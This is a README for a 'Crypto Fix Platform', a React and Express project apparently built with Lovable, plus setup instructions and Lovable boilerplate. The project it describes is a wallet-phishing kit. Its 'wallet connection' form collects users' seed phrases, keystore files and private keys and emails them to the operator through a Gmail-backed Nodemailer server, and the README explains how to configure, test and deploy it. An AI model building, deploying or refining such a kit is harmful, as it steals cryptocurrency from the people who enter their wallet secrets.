# Crypto Fix Platform

A platform showcasing crypto services with a wallet connection form that sends data to a backend server via email when users attempt to connect their wallets.

## Project Structure

This project consists of two main parts:
1. **Frontend**: React/TypeScript web application with a wallet connection form
2. **Backend**: Express.js server that processes form submissions and sends emails using Nodemailer

## Features

- Modern UI design with dark theme
- Interactive wallet connection modal
- Different access methods for wallet connections (Phrase, Keystore JSON, Private Key)
- Backend email service that sends form data to a specified email address
- Toast notifications for form validation and submission status

## Getting Started

### Prerequisites

- Node.js (v14 or later)
- npm or yarn

### Frontend Setup

1. Install dependencies:
```sh
npm install
```

2. Start the development server:
```sh
npm run dev
```

The frontend application will be available at http://localhost:8080

### Backend Setup

1. Navigate to the server directory and install dependencies:
```sh
cd server
npm install
```

2. Create a `.env` file in the server directory with your email configuration:
```
EMAIL_USER=your-gmail@gmail.com
EMAIL_PASS=your-app-password
PORT=3001
```

**Note**: For Gmail, you need to use an App Password. To generate one:
- Enable 2-Step Verification on your Google Account
- Go to Google Account > Security > App passwords
- Generate a new app password and use it in the `.env` file

3. Start the backend server:
```sh
npm run dev
```

The backend server will be available at http://localhost:3001

### Testing the API

You can test the wallet connection API using the included test page:

1. Make sure the backend server is running
2. Open http://localhost:3001/test.html in your browser
3. Fill out the form and click "Test Connection"

### Running Both Frontend and Backend

For convenience, you can also run both the frontend and backend servers simultaneously:

```sh
npm run dev:all
```

### Testing Email Configuration

To verify that your email settings are working correctly:

```sh
cd server
npm run test-email
```

## API Documentation

For detailed API documentation, see [API_DOCUMENTATION.md](./server/API_DOCUMENTATION.md) in the server directory.

## Deployment

For detailed instructions on deploying this application to production environments, see [DEPLOYMENT.md](./DEPLOYMENT.md).

## Project info

**URL**: https://lovable.dev/projects/5e9c6ae7-d7f8-4e19-8fc7-9723834b1549

## How can I edit this code?

There are several ways of editing your application.

**Use Lovable**

Simply visit the [Lovable Project](https://lovable.dev/projects/5e9c6ae7-d7f8-4e19-8fc7-9723834b1549) and start prompting.

Changes made via Lovable will be committed automatically to this repo.

**Use your preferred IDE**

If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.

The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)

Follow these steps:

```sh
# Step 1: Clone the repository using the project's Git URL.
git clone <YOUR_GIT_URL>

# Step 2: Navigate to the project directory.
cd <YOUR_PROJECT_NAME>

# Step 3: Install the necessary dependencies.
npm i

# Step 4: Start the development server with auto-reloading and an instant preview.
npm run dev
```

**Edit a file directly in GitHub**

- Navigate to the desired file(s).
- Click the "Edit" button (pencil icon) at the top right of the file view.
- Make your changes and commit the changes.

**Use GitHub Codespaces**

- Navigate to the main page of your repository.
- Click on the "Code" button (green button) near the top right.
- Select the "Codespaces" tab.
- Click on "New codespace" to launch a new Codespace environment.
- Edit files directly within the Codespace and commit and push your changes once you're done.

## What technologies are used for this project?

This project is built with:

- Vite
- TypeScript
- React
- shadcn-ui
- Tailwind CSS

## How can I deploy this project?

Simply open [Lovable](https://lovable.dev/projects/5e9c6ae7-d7f8-4e19-8fc7-9723834b1549) and click on Share -> Publish.

## Can I connect a custom domain to my Lovable project?

Yes, you can!

To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.

Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
